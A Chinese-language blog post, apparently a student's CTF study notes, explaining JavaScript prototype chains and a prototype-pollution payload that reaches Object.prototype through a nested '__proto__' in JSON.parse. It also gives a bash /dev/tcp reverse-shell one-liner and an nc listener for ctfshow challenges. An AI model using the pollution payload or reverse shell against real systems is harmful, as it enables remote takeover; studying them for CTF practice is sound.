@@ -1,0 +1,379 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>js-proto | wd-z711&#39;s B10g</title>
+  <meta name="author" content="wd-z711">
+  
+  <meta name="description" content="Common student in China. Interested in web &amp; re.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="js-proto"/>
+  <meta property="og:site_name" content="wd-z711&#39;s B10g"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'G-YHJSKZDC3Y', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="wd-z711's B10g" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">wd-z711&#39;s B10g</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> js-proto</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="js中的prototype-amp-proto-amp-constructor"><a href="#js中的prototype-amp-proto-amp-constructor" class="headerlink" title="js中的prototype&amp;_proto_&amp;constructor"></a>js中的prototype&amp;_<em>proto_</em>&amp;constructor</h1><p>引用：<a target="_blank" rel="noopener" href="https://blog.csdn.net/cc18868876837/article/details/81211729">https://blog.csdn.net/cc18868876837/article/details/81211729</a></p>
+<p><strong>注</strong>：<code>__proto__</code>属性也可以写做<code>[[Prototype]]</code>，其具体实现是由浏览器自己实现的。</p>
+<hr>
+<span id="more"></span>
+<h2 id="0x00-博客讲解"><a href="#0x00-博客讲解" class="headerlink" title="0x00 博客讲解"></a>0x00 博客讲解</h2><p>​    首先，先给一个小例子：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;...&#125;;</span><br><span class="line"><span class="keyword">let</span> f1 = <span class="keyword">new</span> <span class="title class_">Foo</span>();</span><br></pre></td></tr></table></figure>
+<p>​    下面说一下<strong>new操作符将函数作为构造器进行调用时的过程：</strong>函数被调用，然后新创建一个对象，此时函数内部的<code>this</code>是指向该新创建的对象，这意味着可以在构造器函数内部通过<code>this</code>参数初始化值，最后返回该新对象的引用。</p>
+<p>​    虽然这两行代码看上去很简单，但是其背后的关系确是错综复杂的，如下所示：</p>
+<p><img src="/images/js-proto/image-20230107200155433.png" alt="image-20230107200155433" style="zoom:80%;" /></p>
+<p>​    上图中，红色箭头表示<code>__proto__</code>属性指向，绿色箭头表示<code>prototype</code>属性的指向，棕色箭头表示<strong>本身具有的<code>constructor</code>属性的指向</strong>，棕色虚线箭头表示<strong>继承而来的<code>constructor</code>属性指向</strong>。</p>
+<p>​    <code>__proto__</code>和<code>__constructor__</code>属性是<strong>对象</strong>独有的，而<code>prototype</code>是<strong>函数</strong>独有的。<strong>由于JS中函数也是一种对象，因此函数同时拥有这3种属性</strong>。</p>
+<p>​    我们按照属性把上图拆分开，之后进行分析，如下图所示：</p>
+<p><img src="/images/js-proto/image-20230107202633895.png" alt="image-20230107202633895" style="zoom:80%;" /></p>
+<p>​    上图仅留下了<code>__proto__</code>属性，这是对象所独有的。<code>__proto__</code>属性都是一个对象指向另一个对象，即指向它们的原型对象（父对象）。<code>__proto__</code>的作用就是当访问一个对象的属性时，如果该对象内部不存在这个属性，那么会去它的<code>__proto__</code>属性所指向的那个对象（父对象）里面去找，如果父对象也不存在这个属性，则继续往上找，直到原型链顶端<code>null</code>，这就是我们所说的<strong>原型链</strong>。</p>
+<p>​    接下来再来看<code>prototype</code>属性，如下图所示：</p>
+<p><img src="/images/js-proto/image-20230107203150678.png" alt="image-20230107203150678" style="zoom:80%;" /></p>
+<p>​    <code>prototype</code>属性是函数独有的，它是<strong>从一个函数指向一个对象，它的含义是函数的原型对象（意思就是<code>prototype</code>指向函数所创建的实例的原型对象，即<code>f1.__proto__==Foo.prototype</code>）</strong>。<code>prototype</code>的作用是包含可以由特定类型的所有实例共享的属性和方法，也就是<strong>让该函数所实例化的对象们都可以找到公用的属性和方法</strong>。任何函数在创建的时候，会默认同时创建该函数的<code>prototype</code>对象。</p>
+<p>​    最后看<code>constructor</code>属性：</p>
+<p><img src="/images/js-proto/image-20230107204220078.png" alt="image-20230107204220078" style="zoom:80%;" /></p>
+<p>​    <code>constructor</code>是对象才拥有的，它是由一个<strong>对象指向一个函数</strong>，含义就是指向该对象的构造函数，而每个对象都有构造函数，从上图中可以看出<strong>Function</strong>这个对象比较特殊，它的构造函数就是它自己（因为Function可以看成是一个函数，也可以是一个对象），所有函数和对象最终都是由Function构造函数得来，所以<code>constructor</code>属性的终点就是<strong>Function</strong>这个函数。</p>
+<p>​    每个对象都可以找到其对应的constructor，因为创建对象的前提是需要有constructor，而这个constructor可能是对象自己本身显式定义的（实线）或者通过<code>__proto__</code>在原型链中找到的（继承）。而单从constructor这个属性来讲，只有prototype对象才有。每个函数在创建的时候，JS会同时创建一个该函数对应的prototype对象，而<code>函数创建的对象.__proto__ === 该函数.prototype</code>，<code>该函数.prototype.constructor===该函数本身</code>，故通过函数创建的对象即使自己没有constructor属性，它也能通过<strong>proto</strong>找到对应的constructor，所以任何对象最终都可以找到其构造函数（null如果当成对象的话，将null除外）。如下：<br><img src="/images/js-proto/image-20230107205253102.png" alt="image-20230107205253102" style="zoom:80%;" /></p>
+<h2 id="0x01-Bro-Xiang’s-Question"><a href="#0x01-Bro-Xiang’s-Question" class="headerlink" title="0x01 Bro Xiang’s Question"></a>0x01 Bro Xiang’s Question</h2><h3 id="JSON-parse-函数"><a href="#JSON-parse-函数" class="headerlink" title="JSON.parse() 函数"></a>JSON.parse() 函数</h3><p>​    <strong>作用：</strong>将json数据转换为js对象。</p>
+<h3 id="Question-code"><a href="#Question-code" class="headerlink" title="Question code"></a>Question code</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">body=<span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;123&quot;&#125;&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="title function_">copy</span>(user.<span class="property">userinfo</span>,body);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user.<span class="property">query</span>);</span><br></pre></td></tr></table></figure>
+<p>​    我们假设，<code>this.userinfo</code>对象所对应的函数是<code>func1</code>，<code>user</code>对象对应的函数是<code>func2</code>。画出上述代码的指向关系：</p>
+<p><img src="/images/js-proto/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png" alt="未命名文件"></p>
+<p><strong>问题1：</strong>为什么不能用1个<code>__proto__</code>？</p>
+<p><strong>答案1：</strong>很容易看出来，1个<code>__proto__</code>只是修改了<code>func1.prototype</code>，并没有对<code>object.prototype</code>进行修改，所以1个<code>__proto__</code>是不行的，然而使用2个<code>__proto__</code>正好。</p>
+<h3 id="web-338-amp-web-339-的反弹shell问题"><a href="#web-338-amp-web-339-的反弹shell问题" class="headerlink" title="web 338 &amp; web 339 的反弹shell问题"></a>web 338 &amp; web 339 的反弹shell问题</h3><p>​    按这个来：<a target="_blank" rel="noopener" href="https://tari.moe/2021/05/04/ctfshow-nodejs/">https://tari.moe/2021/05/04/ctfshow-nodejs/</a></p>
+<p>​    一个小坑就是<code>burp</code>在发<code>post</code>空包的时候，此时光标位置一定要与包头空一行。</p>
+<p><strong>补充：</strong></p>
+<ul>
+<li><p><code>bash -c &#39;command&#39;</code>就可以运行command指令。</p>
+</li>
+<li><p>常用的反弹shell指令：<code>bash -i &gt;&amp; /dev/tcp/vps的ip/vps的端口 0&gt;&amp;1</code>。</p>
+</li>
+</ul>
+<p><img src="/images/js-proto/image-20230108134543200.png" alt="image-20230108134543200" style="zoom:80%;" /></p>
+<ul>
+<li><code>nc -lvp 4444  //l监听,v输出,p端口</code></li>
+<li><code>stdout</code>与<code>stderr</code>。</li>
+</ul>
+<p><img src="/images/js-proto/image-20230108135317142.png" alt="image-20230108135317142" style="zoom:80%;" /></p>
+<ul>
+<li><code>&gt;&amp;</code>总结：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42310347/article/details/116991166">https://blog.csdn.net/weixin_42310347/article/details/116991166</a></li>
+<li>经过测试，如果反弹shell指令是这样的：</li>
+</ul>
+<p>​    <code>bash -i &gt;&amp; /dev/tcp/vps的ip/vps的端口 0&gt;&amp;1</code></p>
+<p>​    那么返回：</p>
+<p><img src="/images/js-proto/image-20230108143713882.png" alt="image-20230108143713882" style="zoom:80%;" /></p>
+<p>​    如果是这样的：<code>bash -i &gt; /dev/tcp/vps的ip/vps的端口 0&gt;&amp;1</code>，那么返回：</p>
+<p><img src="/images/js-proto/image-20230108143750847.png" alt="image-20230108143750847" style="zoom:80%;" /></p>
+
+  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/01/05/blacktooth/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2022/12/28/geekpwn-research/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+
+
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    <!-- 
+    <div id="disqus_thread" class="ds-thread">
+        <script type="text/javascript">
+            /**
+             * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+             * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+             */
+                /*
+                 var disqus_config = function () {
+                 this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
+                 this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+                 };
+                 */
+            (function() { // DON'T EDIT BELOW THIS LINE
+                var d = document, s = d.createElement('script');
+
+                s.src = 'https://https-wd-2711-tech.disqus.com/embed.js';
+
+                s.setAttribute('data-timestamp', +new Date());
+                (d.head || d.body).appendChild(s);
+            })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by
+                Disqus.</a></noscript>
+    </div> -->
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            appId: 'wLIJ70s3fPvW8WJPgVVAuWVR-gzGzoHsz',
+            appKey: 'NVGqxhUkqtFv2CbwmXXWjCdR'
+        })
+    </script>
+
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-01-04 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/web/">web<span>9</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+
+	<!-- copyright -->
+	<div>
+    <ul class="post-copyright">
+      <li class="post-copyright-author">
+      <strong>作者:  </strong>wd-z711</a>
+      </li>
+      <li class="post-copyright-link">
+      <strong>文章链接:  </strong>
+      <a href="/" target="_blank" title="">https://wd-2711.tech/</a>
+      </li>
+      <li class="post-copyright-license">
+        <strong>版权声明:   </strong>
+        本博客所有文章除特别声明外，均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+        许可协议。转载请注明出处!
+      </li>
+    </ul>
+  <div>
+ 	
+
+		
+
+
+</div><!-- row -->
+
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2023 wd-z711
+  
+      <!-- with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
+     <br> Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind.386</a>.     -->
+
+     <!-- <script type="text/javascript">
+      (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+      (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+      e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+      })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+      
+      _st('install','aB-vgeB8gEDrnRJuhceL','2.0.0');
+    </script> -->
+    </p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+   </html>
